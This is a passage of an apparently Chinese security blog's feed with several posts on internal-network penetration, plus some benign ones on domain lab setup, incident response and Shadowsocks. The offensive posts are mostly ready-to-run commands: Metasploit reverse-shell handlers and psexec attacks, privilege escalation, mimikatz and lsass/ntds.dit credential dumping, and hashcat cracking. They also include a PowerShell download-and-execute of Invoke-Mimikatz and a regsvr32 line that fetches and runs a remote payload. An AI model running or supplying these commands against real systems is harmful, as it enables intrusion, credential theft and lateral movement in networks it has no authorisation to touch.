dll&gt;/root/Desktop/443.dll</p></blockquote><p>2.生成木马后，我们在菜刀里放入生成的木马，运行，同时打开msf准备回连</p><blockquote><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.2.111<br>set lport 443<br>run</p></blockquote><p>4.提权</p><blockquote><p>background 或 ctrl+z </p><p>use exploit/windows/local/ms11_080_afdjoinleaf<br>set session 1<br>run<br>hashdump      //密码获取<br>load mimikatz //使用mimikatz<br>kerberos      //查看解密</p></blockquote><p>5.新加路由查看子网</p><blockquote><p>route<br>background<br>sessions<br>route add 192.168.2.0 255.255.255.0 2<br>search mssql   //找mssql模块<br>use auxiliary/scanner/mssql/mssql_login  //使用login模块</p><p>show options </p><p>set rhosts 192.168.177.1/24 </p><p>set password sa@123<br>run<br>show options<br>set BEUTEFORCE_SPEED 0<br>run</p></blockquote><p>端口扫描search portscan </p><blockquote><p>use   auxiliary/scanner/portscan/tcp  //使用scanner模块<br>show options<br>set RHOSTS 192.168.2.0/24<br>set ports 139,445,3389  //设置扫描端口</p></blockquote><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h2><blockquote><p>D:&gt;net use \192.168.1.254\c$ “pwd” /user:user     //连接192.168.1.254的IPC$共享，用unc路径<br>D:&gt;copy srv.exe \192.168.1.254\c$ //复制本地 srv.exe 到C根目录<br>D:&gt;net time \192.168.1.254         //查时间<br>D:&gt;at　\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exe<br>D:&gt;net use \192.168.1.254\c$ /del</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常用一句话webshell&quot;&gt;&lt;a href=&quot;#常用一句话webshell&quot; class=&quot;headerlink&quot; title=&quot;常用一句话webshell&quot;&gt;&lt;/a&gt;常用一句话webshell&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/tennc/webshell&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/tennc/webshell&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="MSF" scheme="https://yaalonsong.github.io/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>Hashcat Readme</title>
    <link href="https://yaalonsong.github.io/2019/01/18/hashcat-readme.html"/>
    <id>https://yaalonsong.github.io/2019/01/18/hashcat-readme.html</id>
    <published>2019-01-17T16:28:52.000Z</published>
    <updated>2019-02-26T15:24:05.092Z</updated>
    
    <content type="html"><![CDATA[<p>#################################################################<br>&amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;</p><p>#################################################################</p><a id="more"></a><p>hash r.txt文件格式   用户名:hash</p><p>–show 导出已破解的用户名:密码   outr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –show –outfile=C:\Users\hash\Desktop\outr.txt –outfile-format 3 –username c:\Users\hash\Desktop\r.txt </p></blockquote><p>–left 导出未破解的用户名:hash   leftr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr.txt –outfile-format 1 –username c:\Users\hash\Desktop\r.txt</p></blockquote><p>增加密码复杂度命令破解leftr.txt（未破解的用户名:hash）</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\outr1.txt –outfile-format 3 –username c:\Users\hash\Desktop\leftr.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force</p></blockquote><p>结束以后导出未爆破用户名加hash.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr2.txt –outfile-format 1 –username c:\Users\hash\Desktop\leftr.txt</p><p>hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\out-1.txt –outfile-format 3 –username c:\Users\hash\Desktop\1.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#################################################################&lt;br&gt;&amp;amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;amp;&lt;/p&gt;
&lt;p&gt;#################################################################&lt;/p&gt;
    
    </summary>
    
      <category term="密码破解" scheme="https://yaalonsong.github.io/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="hashcat" scheme="https://yaalonsong.github.io/tags/hashcat/"/>
    
  </entry>
  
  <entry>
    <title>抓取 Windows 用户或者域用户 hash 的多种姿势</title>
    <link href="https://yaalonsong.github.io/2018/10/18/%E6%8A%93hash.html"/>
    <id>https://yaalonsong.github.io/2018/10/18/抓hash.html</id>
    <published>2018-10-18T14:45:02.000Z</published>
    <updated>2019-02-26T15:19:24.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="抓取-Windows-用户或者域用户-hash-的多种姿势"><a href="#抓取-Windows-用户或者域用户-hash-的多种姿势" class="headerlink" title="抓取 Windows 用户或者域用户 hash 的多种姿势"></a>抓取 Windows 用户或者域用户 hash 的多种姿势</h2><blockquote><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。<a id="more"></a></p><p>执行密码安全审核所需的主要步骤是获取包含信息的文件，从文件中转储密码哈希值，然后使用密码破解程序测试弱密码的这些哈希值。</p><p>通过获取Ntds.dit和SYSTEM文件的副本，最可靠的执行密码审计的方法是脱机的。由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。</p></blockquote><ul><li><p>使用mimikatz本机测试直接获取内存中的明文密码</p></li><li><p>mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li><li><p>非交互式抓明文密码(webshell中)</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell加载mimikatz抓取密码</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz</span><br></pre></td></tr></table></figure></li><li><p>ProcDump + Mimikatz</p></li></ul><p>==ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如目标08的,本地就要用08系统来分析)==</p><p>远程主机：<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe c:\a.dmp    </span><br><span class="line">或者任务管理器找到lsass.exe进程右键创建转储文件</span><br></pre></td></tr></table></figure></p><p>本地主机：mimikatz</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">a.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span> <span class="title">full</span></span></span><br></pre></td></tr></table></figure><ul><li>ntds.dit 的导出</li></ul><p>ntdsutil win2008开始DC中自带的工具<br>交互式<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line">//copy 完之后再执行</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure></p><p>非交互<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "activate instance ntds" create quit quit</span><br><span class="line">ntdsutil snapshot "mount &#123;GUID&#125;" quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit</span><br></pre></td></tr></table></figure></p><ul><li>QuarkPwDump分析 <a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a></li></ul><p>在线提取（直接在目标主机执行，实战中不选择此方式。）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure></p><p>离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt</span><br></pre></td></tr></table></figure><ul><li>WINDOWS SERVER 2008-2016<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ntdsutil</span><br><span class="line">ntdsutil: activate instance ntds</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:\audit</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure></li></ul><p>解出ntds的hash</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><p>  NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe" target="_blank" rel="noopener">下载地址</a></p><p>NtdsAudit需要<code>ntds.dit</code> Active Directory数据库，<code>SYSTEM</code> 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置<code>ntdsutil</code>实用程序。</p><ul><li><p>以管理员身份打开命令提示符（<code>cmd.exe</code>）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。</p></li><li><p>在命令提示符下，键入以下命令，然后按ENTER键：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br></pre></td></tr></table></figure><ul><li>在ntdsutil提示符下，键入以下命令，然后按Enter：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">activate instance ntds</span><br></pre></td></tr></table></figure><ul><li>在ntdsutil提示符下，键入以下命令，然后按Enter：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifm</span><br></pre></td></tr></table></figure><ul><li>在ifm提示符下，键入以下命令，然后按Enter：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br></pre></td></tr></table></figure><p> <code>&lt;Drive&gt;:\&lt;Folder&gt;</code> 是要创建的文件的文件夹路径。</p><p>例如，以下命令将显示统计信息，输出<code>pwdump.txt</code>包含密码哈希值的文件，并输出<code>users.csv</code>包含每个用户帐户详细信息的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv</span><br></pre></td></tr></table></figure><h2 id="Linux-明文密码的获取"><a href="#Linux-明文密码的获取" class="headerlink" title="Linux 明文密码的获取"></a>Linux 明文密码的获取</h2><p>mimipenguin</p><p>git clone <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>支持的操作系统</p><table><thead><tr><th>os</th><th>service</th><th>supported</th></tr></thead><tbody><tr><td>Ubuntu Desktop 12.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Ubuntu Desktop 16.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Fedora Workstation 25 (x86_64)</td><td>gnome-keyring-daemon (3.20.0)</td><td>Y</td></tr><tr><td>Fedora Workstation 27 (x86_64)</td><td>gnome-keyring-daemon (3.20.1)</td><td>Y</td></tr><tr><td>Kali-rolling x64</td><td>gnome-keyring-daemon (3.28.0.2)</td><td>Y</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;抓取-Windows-用户或者域用户-hash-的多种姿势&quot;&gt;&lt;a href=&quot;#抓取-Windows-用户或者域用户-hash-的多种姿势&quot; class=&quot;headerlink&quot; title=&quot;抓取 Windows 用户或者域用户 hash 的多种姿势&quot;&gt;&lt;/a&gt;抓取 Windows 用户或者域用户 hash 的多种姿势&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。
    
    </summary>
    
      <category term="内网" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="域" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>windows linux 应急响应流程及实战演练</title>
    <link href="https://yaalonsong.github.io/2018/10/17/windows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html"/>
    <id>https://yaalonsong.github.io/2018/10/17/windows linux 应急响应.html</id>
    <published>2018-10-16T16:40:20.799Z</published>
    <updated>2018-10-16T16:52:24.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p></blockquote><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/odo2Fjtklj-ibStAsyUjHw" target="_blank" rel="noopener">windows 应急流程及实战演练</a></p><p><a href="https://mp.weixin.qq.com/s/mG0O8Pr8kFF195JLc-XD3A" target="_blank" rel="noopener">Linux 应急响应流程及实战演练</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="应急响应" scheme="https://yaalonsong.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="应急响应" scheme="https://yaalonsong.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>搭建域环境</title>
    <link href="https://yaalonsong.github.io/2018/10/16/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
    <id>https://yaalonsong.github.io/2018/10/16/域环境搭建.html</id>
    <published>2018-10-16T15:34:38.000Z</published>
    <updated>2018-10-16T15:48:13.449Z</updated>
    
    <content type="html"><![CDATA[<p><strong>域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2</strong></p><p><strong>Windows 2008 server R2 (域控)</strong></p><a id="more"></a><p>1、修改计算机名： 可以改成DC或者其他什么看着顺眼的名字，默认也行，就是搭建好域以后再改可能会遇到一些问题；</p><p><img src="/uploads/y1.png" alt="imgl"></p><p><img src="/uploads/y2.png" alt="imgl"></p><p>2、配置固定ip: 我虚拟机使用的桥接方式，并且路由器是192.168.3.1，所以在这如此设置，此处的DNS填写本机即，127.0.0.1；</p><p><img src="/uploads/y3.png" alt="imgl"></p><p>3、服务器管理器—角色：安装Active Directory 域服务并且会同时要求安装DNS服务器；</p><p><img src="/uploads/y4.png" alt="imgl"></p><p>4、配置域服务:打开服务器管理器或者在运行框下输入 dcpromo直接进行配置，选择新建，</p><p>Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码；</p><p><img src="/uploads/y5.png" alt="imgl"></p><p>5、设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见：<a href="http://angerfire.blog.51cto.com/198455/144123/" target="_blank" rel="noopener">http://angerfire.blog.51cto.com/198455/144123/ </a></p><p>6、域数据存放的地址：默认即可。</p><p><strong>DM: Windows 2003 server SP2</strong></p><p>1、如果新安装的虚拟机安装时会有选择项是加入域还是组，我这里选择加入域，会让登录当前域的账号密码即“Domaim\administrator”（必须是域账号不是administrator）和对应密码；已有的Windows2003加入域，首先更改组为域选择正确的domain和domain账号密码即可。</p><p>2、安装成功后配置静态IP，DNS处填写DC的IP；</p><p><img src="/uploads/y6.png" alt="imgl"></p><p>3、在2003上执行net time显示如图，说明已经加入域，并且在Windows2008上的domain.com域，控制器上可以看到03的机器；</p><p><img src="/uploads/y7.png" alt="imgl"></p><p><img src="/uploads/y8.png" alt="imgl"></p><p><strong>域已经搭建完成，主域控会生成一个 krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。</strong><br><img src="/uploads/y9.png" alt="imgl"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Windows 2008 server R2 (域控)&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="内网" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="域" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>通过MSF使用SMB端口远程连接目标的技巧</title>
    <link href="https://yaalonsong.github.io/2018/10/16/msf%20smb.html"/>
    <id>https://yaalonsong.github.io/2018/10/16/msf smb.html</id>
    <published>2018-10-16T14:55:36.000Z</published>
    <updated>2019-02-28T13:06:48.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。</p></blockquote><a id="more"></a><h3 id="exploit-windows-smb-psexec"><a href="#exploit-windows-smb-psexec" class="headerlink" title="exploit/windows/smb/psexec"></a>exploit/windows/smb/psexec</h3><p><code>msf &gt; use exploit/windows/smb/psexec</code><br><code>msf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec) &gt; set LPORT 4444</code><br><code>msf exploit(windows/smb/psexec) &gt; exploit</code></p><blockquote><p>执行后有一个session回连<br>经实验表明，使用本地账户即使是管理员权限也不能使用此方法得到一个 meterpreter ，只能使用 administrator 的用户名密码才能回来一个 session ；<br>当在域环境使用时，smbuser 不是写成domain/administrator （这样的用户名是Exploit failed 执行不成功的）而是写成 administrator ，并且只要是域管理员都能执行成功并反弹一个 meterpreter 的 session 。</p></blockquote><h3 id="exploit-windows-smb-psexec-psh"><a href="#exploit-windows-smb-psexec-psh" class="headerlink" title="exploit/windows/smb/psexec_psh"></a>exploit/windows/smb/psexec_psh</h3><p><code>msf &gt; use exploit/windows/smb/psexec_psh</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lport 4444</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; exploit</code> </p><h3 id="exploit-multi-script-web-delivery"><a href="#exploit-multi-script-web-delivery" class="headerlink" title="exploit/multi/script/web_delivery"></a>exploit/multi/script/web_delivery</h3><p>使用exploit/multi/script/web_delivery 生成恶意dll代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; show targets </span><br><span class="line">Exploit targets:</span><br><span class="line">   Id  Name</span><br><span class="line">---</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">   3   Regsvr32</span><br><span class="line">   4   PSH (Binary)</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set target 3</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set lport 4444</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.2.145:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/s7sa27EEtl</span><br><span class="line">[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="auxiliary-admin-smb-psexec-command"><a href="#auxiliary-admin-smb-psexec-command" class="headerlink" title="auxiliary/admin/smb/psexec_command"></a>auxiliary/admin/smb/psexec_command</h3><p>使用 auxiliary/admin/smb/psexec_command 在远程目标上执行命令种恶意 dll 回连 meterpreter ；<br><code>msf &gt; use auxiliary/admin/smb/psexec_command</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; exploit</code></p><p>经实验表明，当目标机器有杀毒软件的时候，会拦截其从服务器上下载恶意 dll 文件 s7sa27EEtl.sct （测试机为赛门铁克未授权版），毕竟 msf 的恶意dll 特征码已经被杀毒引擎收录，如果确定目标机其没有杀软便可使用。</p><h3 id="auxiliary-scanner-smb-impacket-wmiexec"><a href="#auxiliary-scanner-smb-impacket-wmiexec" class="headerlink" title="auxiliary/scanner/smb/impacket/wmiexec"></a>auxiliary/scanner/smb/impacket/wmiexec</h3><p><code>msf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexec</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /all</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit</code> </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="MSF" scheme="https://yaalonsong.github.io/categories/msf/"/>
    
    
      <category term="内网" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="msf" scheme="https://yaalonsong.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 安装 Shadowscoks</title>
    <link href="https://yaalonsong.github.io/2018/07/31/CentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html"/>
    <id>https://yaalonsong.github.io/2018/07/31/CentOS-7-安装-shadowscoks.html</id>
    <published>2018-07-31T14:54:56.882Z</published>
    <updated>2018-08-22T17:16:52.388Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>首先安装 pip ，使用 pip 安装 Shadowsocks </p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum upgrade</span><br><span class="line">yum install python-pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></li><li><p>新建 Shadowsocks 的配置文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadowsocks.json</span><br></pre></td></tr></table></figure></li><li><p>编辑 Shadowocks 配置文件</p></li><li><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">1111</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"yourpassword"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置firewall，允许 Shadowsocks 服务端口被外网访问</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">以下命令会永久生效</span><br><span class="line">firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">1111</span>/tcp --permanent</span><br><span class="line">重新载入 firewall</span><br><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br></pre></td></tr></table></figure></li><li><p>启动 ssserver 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 